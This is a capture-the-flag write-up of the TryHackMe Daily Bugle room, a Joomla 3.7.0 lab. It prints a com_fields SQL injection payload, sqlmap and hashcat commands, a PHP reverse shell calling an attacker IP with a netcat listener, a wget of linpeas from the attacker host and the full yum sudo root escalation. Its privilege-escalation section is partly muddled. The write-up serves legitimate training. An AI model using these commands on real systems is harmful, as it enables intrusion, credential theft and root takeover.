# Joomla version number : 3.7.0 Exploitation Write-up (Tryhackme Daily Bugle room )
## 1. Introduction
###
In this penetration testing challenge, I targeted a machine running Joomla 3.7.0 hosted at http://10.10.47.25. The goal was to exploit the system, gain administrative access, establish a reverse shell, and ultimately capture both the user and root flags through privilege escalation.

## 2. Initial Reconnaissance
###
I started with a basic Nmap scan to identify open ports and services:
nmap -sC -sV -oN nmap.txt 10.10.47.25

Results:

  Port 80: Apache HTTP server

  Joomla 3.7.0 CMS detected from page source

  ## 3. Exploitation Process
  ###
  ** 3.1 SQL Injection in Joomla 3.7.0 **

Joomla 3.7.0 contains a SQL injection vulnerability in the com_fields component due to improper input validation. I confirmed the vulnerability using a payload:

bash


http://10.10.47.25/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,(SELECT user())),0)

To automate the data extraction, I used sqlmap:

sqlmap -u "http://10.10.47.25/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" --dump



Extracted Data:

  Username: Jonah

  Password Hash: $2y$10$0veO/JSFh4389Lluc4Xya.df...





** 3.2 Cracking the Password Hash **




The bcrypt hash was cracked using Hashcat with the rockyou.txt wordlist:


hashcat -m 3200 hash.txt rockyou.txt

The password i got is : spiderman123






** 3.3 Joomla Admin Login and Reverse Shell Upload **



![Image](https://github.com/user-attachments/assets/39facfb2-e98a-4bee-bfe0-10d9b0fd813d)







Using the credentials Jonah:spiderman123, I logged into the admin panel at:

http://10.10.47.25/administrator/


Inside the Templates > index.php, I replaced the code with a PHP reverse shell payload (from pentestmonkey) and changed the IP and port accordingly:


![Image](https://github.com/user-attachments/assets/321f2b59-5c23-419b-bfd6-22dbfd7bc4d0)

$ip = '10.13.83.247';  // Attacker IP
$port = 7777;          // Listening port


** 3.4 Reverse Shell Access **

Before executing the payload, I set up a listener on my machine:

nc -lvnp 7777

Then I accessed:

http://10.10.47.25/templates/index.php

Boom — I got a shell as www-data:

Linux target 4.x.x-xx-generic
uid=33(www-data) gid=33(www-data) groups=33(www-data)

## 4. Post Exploitation

** 4.1 Enumerating Users **

From the reverse shell, I checked /home/:

ls /home/

Found a user named jonah. I navigated to the home directory and found the user flag:

cat /home/jonah/user.txt


User Flag Acquired ✅
** 4.2 Privilege Escalation **

To escalate privileges, I uploaded LinPeas.sh to the target system by hosting it on a Python HTTP server:


![Image](https://github.com/user-attachments/assets/e2ae4bed-d5fd-4142-84b0-6eef95334ee9)




# On my machine:
python3 -m http.server 8000

# On target (via reverse shell):
wget http://10.13.83.247:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

** 4.3 Exploiting Sudo Rights **

LinPeas revealed that the user jonah had password at var/www/html/configuration.php

![Image](https://github.com/user-attachments/assets/f8e7d088-3b2a-45b8-82b6-4d27a4553a4e)



(ALL) NOPASSWD: /usr/bin/nano

To escalate, I ran:

cd var/www/html

ls 

cat user.txt

** 4.4 Root Flag **

![Image](https://github.com/user-attachments/assets/150fd8b8-61f5-44b7-8d36-8740436bd2b2)

TYPED IN THE FOLLOWING EXPLOIT FROM https://gtfobins.github.io/gtfobins/yum/

<<
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
>>

AND EXECUTED IT WITH :

sudo yum -c $TF/x --enableplugin=y

Once root access was obtained, I navigated to /root/ and grabbed the flag:

cat /root/root.txt

Root Flag Acquired ✅


![Image](https://github.com/user-attachments/assets/6a4c8d5a-e391-414b-9cfc-e54105a4e729)


## 5. Conclusion

This challenge involved a full exploitation chain:

   ✅ SQL Injection to extract credentials

   ✅ Cracking password hashes with Hashcat

   ✅ Joomla admin login and remote PHP shell upload

   ✅ Reverse shell access

   ✅ Post-exploitation enumeration with LinPeas

   ✅ Privilege escalation using sudo misconfigurations

   ✅ Extraction of both user and root flags

This exercise reinforced key web exploitation and Linux post-exploitation techniques commonly found in real-world scenarios.

## Proof of completion 

![Image](https://github.com/user-attachments/assets/b958c042-dcdf-4782-8ef3-a46b324f15ac)




  
